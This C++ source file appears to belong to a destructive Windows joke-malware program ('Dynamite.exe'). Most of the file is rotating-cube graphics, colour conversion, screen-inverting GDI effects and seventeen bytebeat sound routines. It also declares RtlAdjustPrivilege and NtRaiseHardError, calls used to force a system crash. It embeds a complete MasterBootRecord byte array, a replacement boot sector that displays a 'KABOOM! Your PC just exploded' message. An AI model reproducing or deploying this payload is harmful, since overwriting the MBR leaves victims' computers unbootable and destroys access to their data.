#include <Windows.h>
#include <math.h>
#include <iostream>
#include <chrono>
#include <thread>
#include <mmsystem.h>
#include <random>
#include <stdlib.h>


#pragma comment(lib, "winmm.lib")


#define _USE_MATH_DEFINES

extern "C" NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN OldValue);
extern "C" NTSTATUS NTAPI NtRaiseHardError(LONG ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask,
	PULONG_PTR Parameters, ULONG ValidResponseOptions, PULONG Response);


/* ROTATING CUBE STUFF */

int SCREEN_WIDTH = 1920;
int SCREEN_HEIGHT = 1080;


struct Point3D {
	double x, y, z;
};
struct Face {
	int vertexIndices[4];
	COLORREF color;
};
struct Cube {
	Point3D vertices[8];
	Face faces[6];
};
Cube CreateCube(double size) {
	SetProcessDPIAware();
	Cube cube;
	double halfSize = size / 2;

	// Define vertices
	cube.vertices[0] = { -halfSize, -halfSize, -halfSize };
	cube.vertices[1] = { halfSize, -halfSize, -halfSize };
	cube.vertices[2] = { -halfSize, halfSize, -halfSize };
	cube.vertices[3] = { halfSize, halfSize, -halfSize };
	cube.vertices[4] = { -halfSize, -halfSize, halfSize };
	cube.vertices[5] = { halfSize, -halfSize, halfSize };
	cube.vertices[6] = { -halfSize, halfSize, halfSize };
	cube.vertices[7] = { halfSize, halfSize, halfSize };

	// Define faces
	cube.faces[0] = { { 0, 1, 3, 2 }, RGB(255, 0, 0) };   // Front face (red)
	cube.faces[1] = { { 4, 5, 7, 6 }, RGB(0, 255, 0) };   // Back face (green)
	cube.faces[2] = { { 0, 4, 6, 2 }, RGB(0, 0, 255) };   // Left face (blue)
	cube.faces[3] = { { 1, 5, 7, 3 }, RGB(255, 255, 0) }; // Right face (yellow)
	cube.faces[4] = { { 0, 1, 5, 4 }, RGB(255, 0, 255) }; // Top face (magenta)
	cube.faces[5] = { { 2, 3, 7, 6 }, RGB(0, 255, 255) }; // Bottom face (cyan)

	return cube;
}
void RotateCube(Cube& cube, double xSpeed, double ySpeed, double zSpeed) {
	SetProcessDPIAware();
	for (int i = 0; i < 8; i++) {
		double x = cube.vertices[i].x;
		double y = cube.vertices[i].y;
		double z = cube.vertices[i].z;

		// Rotate around x-axis
		double y1 = y * cos(xSpeed) - z * sin(xSpeed);
		double z1 = y * sin(xSpeed) + z * cos(xSpeed);

		// Rotate around y-axis
		double x2 = x * cos(ySpeed) + z1 * sin(ySpeed);
		double z2 = -x * sin(ySpeed) + z1 * cos(ySpeed);

		// Rotate around z-axis
		double x3 = x2 * cos(zSpeed) - y1 * sin(zSpeed);
		double y3 = x2 * sin(zSpeed) + y1 * cos(zSpeed);

		cube.vertices[i].x = x3;
		cube.vertices[i].y = y3;
		cube.vertices[i].z = z2;
	}
}
COLORREF GetSmoothBackgroundColor(double t) {
	SetProcessDPIAware();
	// Convert t from range [0, 1] to hue range [0, 360]
	int hue = static_cast<int>(t * 360.0);

	// Convert hue to RGB color
	double r, g, b;
	double h = hue / 60.0;
	double f = h - static_cast<int>(h);
	double p = 0;
	double q = 1 - f;
	double t2 = f;

	if (hue < 60) {
		r = 1;
		g = t2;
		b = 0;
	}
	else if (hue < 120) {
		r = q;
		g = 1;
		b = 0;
	}
	else if (hue < 180) {
		r = 0;
		g = 1;
		b = t2;
	}
	else if (hue < 240) {
		r = 0;
		g = q;
		b = 1;
	}
	else if (hue < 300) {
		r = t2;
		g = 0;
		b = 1;
	}
	else {
		r = 1;
		g = 0;
		b = q;
	}

	return RGB(static_cast<int>(r * 255), static_cast<int>(g * 255), static_cast<int>(b * 255));
}
void DrawCube(HDC hdc, const Cube& cube) {
	SetProcessDPIAware();
	const int edges[12][2] = {
		{ 0, 1 }, { 1, 3 }, { 3, 2 }, { 2, 0 }, // Front face
		{ 4, 5 }, { 5, 7 }, { 7, 6 }, { 6, 4 }, // Back face
		{ 0, 4 }, { 1, 5 }, { 3, 7 }, { 2, 6 }  // Connecting edges
	};

	for (const auto& face : cube.faces) {
		POINT facePoints[4];
		for (int i = 0; i < 4; i++) {
			int vertexIndex = face.vertexIndices[i];
			int x = static_cast<int>(cube.vertices[vertexIndex].x);
			int y = static_cast<int>(cube.vertices[vertexIndex].y);
			int z = static_cast<int>(cube.vertices[vertexIndex].z);

			facePoints[i] = { SCREEN_WIDTH / 2 + x, SCREEN_HEIGHT / 2 + y + z };
		}

		HBRUSH hBrush = CreateSolidBrush(face.color);
		SelectObject(hdc, hBrush);
		Polygon(hdc, facePoints, 4);
		DeleteObject(hBrush);
	}

	HPEN hPen = CreatePen(PS_SOLID, 2, RGB(0, 0, 0)); // Thicker lines, black color
	SelectObject(hdc, hPen);
	for (int i = 0; i < 12; i++) {
		int index1 = edges[i][0];
		int index2 = edges[i][1];

		int x1 = static_cast<int>(cube.vertices[index1].x);
		int y1 = static_cast<int>(cube.vertices[index1].y);
		int z1 = static_cast<int>(cube.vertices[index1].z);

		int x2 = static_cast<int>(cube.vertices[index2].x);
		int y2 = static_cast<int>(cube.vertices[index2].y);
		int z2 = static_cast<int>(cube.vertices[index2].z);

		MoveToEx(hdc, SCREEN_WIDTH / 2 + x1, SCREEN_HEIGHT / 2 + y1 + z1, NULL);
		LineTo(hdc, SCREEN_WIDTH / 2 + x2, SCREEN_HEIGHT / 2 + y2 + z2);
	}
	DeleteObject(hPen);
}

/* MISC */
VOID WINAPI ci(int x, int y, int w, int h)
{
	HDC hdc = GetDC(0);
	HRGN hrgn = CreateEllipticRgn(x, y, w + x, h + y);
	SelectClipRgn(hdc, hrgn);
	BitBlt(hdc, x, y, w, h, hdc, x, y, NOTSRCCOPY);
	DeleteObject(hrgn);
	ReleaseDC(NULL, hdc);
}
typedef struct
{
	FLOAT h;
	FLOAT s;
	FLOAT l;
} HSL;
namespace Colors
{


	HSL rgb2hsl(RGBQUAD rgb)
	{
		HSL hsl;

		BYTE r = rgb.rgbRed;
		BYTE g = rgb.rgbGreen;
		BYTE b = rgb.rgbBlue;

		FLOAT _r = (FLOAT)r / 255.f;
		FLOAT _g = (FLOAT)g / 255.f;
		FLOAT _b = (FLOAT)b / 255.f;

		FLOAT rgbMin = min(min(_r, _g), _b);
		FLOAT rgbMax = max(max(_r, _g), _b);

		FLOAT fDelta = rgbMax - rgbMin;
		FLOAT deltaR;
		FLOAT deltaG;
		FLOAT deltaB;

		FLOAT h = 0.f;
		FLOAT s = 0.f;
		FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);

		if (fDelta != 0.f)
		{
			s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
			deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);

			if (_r == rgbMax)      h = deltaB - deltaG;
			else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
			else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
			if (h < 0.f)           h += 1.f;
			if (h > 1.f)           h -= 1.f;
		}

		hsl.h = h;
		hsl.s = s;
		hsl.l = l;
		return hsl;
	}

	RGBQUAD hsl2rgb(HSL hsl)
	{
		RGBQUAD rgb;

		FLOAT r = hsl.l;
		FLOAT g = hsl.l;
		FLOAT b = hsl.l;

		FLOAT h = hsl.h;
		FLOAT sl = hsl.s;
		FLOAT l = hsl.l;
		FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);

		FLOAT m;
		FLOAT sv;
		FLOAT fract;
		FLOAT vsf;
		FLOAT mid1;
		FLOAT mid2;

		INT sextant;

		if (v > 0.f)
		{
			m = l + l - v;
			sv = (v - m) / v;
			h *= 6.f;
			sextant = (INT)h;
			fract = h - sextant;
			vsf = v * sv * fract;
			mid1 = m + vsf;
			mid2 = v - vsf;

			switch (sextant)
			{
			case 0:
				r = v;
				g = mid1;
				b = m;
				break;
			case 1:
				r = mid2;
				g = v;
				b = m;
				break;
			case 2:
				r = m;
				g = v;
				b = mid1;
				break;
			case 3:
				r = m;
				g = mid2;
				b = v;
				break;
			case 4:
				r = mid1;
				g = m;
				b = v;
				break;
			case 5:
				r = v;
				g = m;
				b = mid2;
				break;
			}
		}

		rgb.rgbRed = (BYTE)(r * 255.f);
		rgb.rgbGreen = (BYTE)(g * 255.f);
		rgb.rgbBlue = (BYTE)(b * 255.f);

		return rgb;
	}
}
int red, green, blue;
bool ifcolorblue = false, ifblue = false;
COLORREF Hue(int length) { //credits to Void_/GetMBR again
	if (red != length) {
		red < length; red++;
		if (ifblue == true) {
			return RGB(red, 0, length);
		}
		else {
			return RGB(red, 0, 0);
		}
	}
	else {
		if (green != length) {
			green < length; green++;
			return RGB(length, green, 0);
		}
		else {
			if (blue != length) {
				blue < length; blue++;
				return RGB(0, length, blue);
			}
			else {
				red = 0; green = 0; blue = 0;
				ifblue = true;
			}
		}
	}
}
typedef union _RGBQUAD {
	COLORREF rgb;
	struct {
		BYTE r;
		BYTE g;
		BYTE b;
		BYTE Reserved;
	};
}_RGBQUAD, * PRGBQUAD;
double smoothColor(double t) {
	return t * t * (3 - 2 * t);
}
COLORREF interpolateColors(COLORREF color1, COLORREF color2, double t) {
	BYTE r1 = GetRValue(color1);
	BYTE g1 = GetGValue(color1);
	BYTE b1 = GetBValue(color1);

	BYTE r2 = GetRValue(color2);
	BYTE g2 = GetGValue(color2);
	BYTE b2 = GetBValue(color2);

	BYTE r = static_cast<BYTE>(r1 + smoothColor(t) * (r2 - r1));
	BYTE g = static_cast<BYTE>(g1 + smoothColor(t) * (g2 - g1));
	BYTE b = static_cast<BYTE>(b1 + smoothColor(t) * (b2 - b1));

	return RGB(r, g, b);
}
const unsigned char MasterBootRecord[] = {
0xEB, 0x00, 0xE8, 0x35, 0x00, 0x8C, 0xC8, 0x8E, 0xD8, 0xBE, 0x58, 0x7C, 0xB9, 0x00, 0x00, 0xE8, 0x0E, 0x00, 0xE8, 0x34, 0x00, 0x41, 0x83, 0xF9, 0x28, 0x75, 0x03, 0xB9, 0x00, 0x00, 0xEB, 0xF2, 0x50, 0xFC, 0x8A, 0x04, 0x3C, 0x00, 0x74, 0x06, 0xE8, 0x06, 0x00, 0x46, 0xEB, 0xF4, 0x58, 0xEB, 0xFE, 0xB4, 0x0E, 0xB7, 0x00, 0xB3, 0x04, 0xCD, 0x10, 0xC3, 0xB4, 0x06, 0xB0, 0x00, 0xB7, 0x07, 0xB9, 0x00, 0x00, 0xBA, 0x4F, 0x18, 0xCD, 0x10, 0xC3, 0xB4, 0x07, 0xB0, 0x00, 0xB7, 0x00, 0xB9, 0x01, 0x00, 0xBA, 0x4F, 0x18, 0xCD, 0x10, 0xC3, 0x4B, 0x41, 0x42, 0x4F, 0x4F, 0x4D, 0x21, 0x20, 0x59, 0x6F, 0x75, 0x72, 0x20, 0x50, 0x43, 0x20, 0x6A, 0x75, 0x73, 0x74, 0x20, 0x65, 0x78, 0x70, 0x6C, 0x6F, 0x64, 0x65, 0x64, 0x20, 0x64, 0x75, 0x65, 0x20, 0x74, 0x6F, 0x20, 0x44, 0x79, 0x6E, 0x61, 0x6D, 0x69, 0x74, 0x65, 0x2E, 0x65, 0x78, 0x65, 0x21, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
};


/* SOUND */
VOID WINAPI sound1() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 16000, 16000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 127] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t >> 4) | (t << 3) & (t >> 8);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound2() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 127] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((t >> 6 | t << 1) + (t >> 5 | t << 3 | t >> 3) | t >> 2 | t << 1);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound3() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 127] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (t >> 5));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound4() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 127] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * ((t >> 1 | t >> 10) & 30) & t << 1);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound5() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 127] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (t >> 8 * (t >> 15 | t >> 8) & (20 | 5 * (t >> 19) >> t | t >> 3)));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound6() {
		HWAVEOUT hWaveOut = 0;
		WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
		waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
		char buffer[8000 * 127] = {};
		for (DWORD t = 0; t < sizeof(buffer); ++t)
			buffer[t] = static_cast<char>(t >> 6 ^ t & 37 | t + (t ^ t >> 11) - t * ((t % 24 ? 2 : 6) & t >> 11) ^ t << 1 & (t & 598 ? t >> 4 : t >> 10));

		WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
		waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
		waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
		waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
		waveOutClose(hWaveOut);
}
VOID WINAPI sound7() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 127] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t >> t * (t >> 10) * (t >> 7 | t >> 6));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound8() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 16000, 16000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[16000 * 60] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t >> 10 ^ t >> 11) % 5 * ((t >> 14 & 3 ^ t >> 15 & 1) + 1) * t % 99 + ((3 + (t >> 14 & 3) - (t >> 16 & 1)) / 3 * t % 99 & 64);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound9() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[32000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((((t & t >> 12) * (t >> 4 | t >> 8) & 255) + ((t >> 12) - 1 & 1 ? t ^ t >> t ^ (t ^ t >> t) + ((t >> 15) + 1) : 0)) / 2);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound10() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 127] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		if ((t >> 13 ^ t >> 8) != 0) buffer[t] = static_cast<char>(t * t / (t >> 13 ^ t >> 8));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound11() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 127] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t >> 6 ^ 5 & 77 | t + (77 ^ t >> 11) - t * ((t % 65 ? 2 : 6) & t >> 11) ^ t << 1 & (t & 598 ? t >> 4 : t >> 5));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound12() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 127] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (t & 16384 ? 6 : 5) * (1 + (1 & t >> 12)) >> (3 & t >> 8) | t >> 3);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound13() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 127] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t >> 10 ^ t >> 11) % 5 * ((t >> 14 & 3 ^ t >> 15 & 1) + 1) * t % 99 + ((3 + (t >> 14 & 3) - (t >> 16 & 1)) / 3 * t % 99 & 64);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound14() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 127] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t >> (t % 32 ? 4 : 3) | (t % 128 ? t >> 3 : t >> 3 | t >> 9));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound15() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 127] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t + (t & t ^ t >> 6) - t * ((t >> 9) & (t % 16 ? 2 : 6) & t >> 9));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound16() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 127] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (1 + (5 & t >> 10)) * (3 + (t >> 17 & 1 ? (2 ^ 2 & t >> 14) / 3 : 3 & (t >> 13) + 1)) >> (3 & t >> 9)) & (t & 4096 ? (t * (t ^ t % 9) | t >> 3) >> 1 : 255);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound17() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t >> 10 ^ t >> 11) % 5 * ((t >> 14 & 3 ^ t >> 15 & 1) + 1) * t % 99 + ((3 + (t >> 14 & 3) - (t >> 16 & 1)) / 3 * t % 99 & 64);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
